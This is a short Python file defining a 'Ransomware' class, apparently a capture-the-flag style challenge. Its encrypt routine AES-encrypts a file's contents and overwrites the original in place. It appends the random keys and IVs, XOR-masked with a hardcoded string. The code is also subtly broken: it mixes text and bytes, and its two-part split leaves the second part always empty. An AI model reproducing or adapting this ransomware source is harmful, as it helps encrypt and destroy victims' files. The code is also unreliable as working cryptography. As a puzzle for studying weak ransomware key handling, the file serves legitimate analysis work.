#!/usr/bin/python

from Crypto.Cipher import AES
from Crypto import Random

class Ransomware:
  
  def pad(self, body):
    # PCKS7 padding
    length = 16 - (len(body) % 16)
    return (body + bytes([length])*length)

  def shadow(self, string):
    s = "R34LH4X0RC4NC0D3"
    res = ""
    for i in range(0, len(s)):
      res += chr(ord(string[i]) ^ ord(s[i]))
    return res

  def encrypt(self, filepath):
    f = open(filepath, 'r')
    body = f.read()
    f.close()

    length = len(body)

    part1 = self.pad(body[:length])
    part2 = self.pad(body[length:])

    iv1 = Random.new().read(16)
    key1 = Random.new().read(16)

    cipher1 = AES.new(key1, AES.MODE_CFB, iv1)
    enc1 = cipher1.encrypt(part1)

    iv2 = Random.new().read(16)
    key2 = Random.new().read(16)

    cipher2 = AES.new(key2, AES.MODE_OFB, iv2)
    enc2 = cipher2.encrypt(part2)

    encryptedBody = ""
    encryptedBody += enc1 + self.shadow(iv1) + self.shadow(key1)
    encryptedBody += enc2 + self.shadow(iv2) + self.shadow(key2)

    f = open(filepath, 'w')
    f.write(encryptedBody)
    f.close()